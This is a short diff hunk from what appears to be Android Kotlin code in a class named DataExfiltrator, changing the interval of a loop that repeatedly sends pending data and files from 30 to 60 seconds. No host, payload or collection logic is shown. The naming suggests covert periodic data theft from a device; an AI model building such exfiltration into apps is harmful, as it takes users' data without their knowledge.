@@ -60,7 +60,7 @@ class DataExfiltrator(private val context: Context) {
             while (isRunning) {
                 sendPendingData()
                 sendPendingFiles()
-                delay(30000) // 30 seconds
+                delay(60000) // 60 seconds
             }
         }
     }
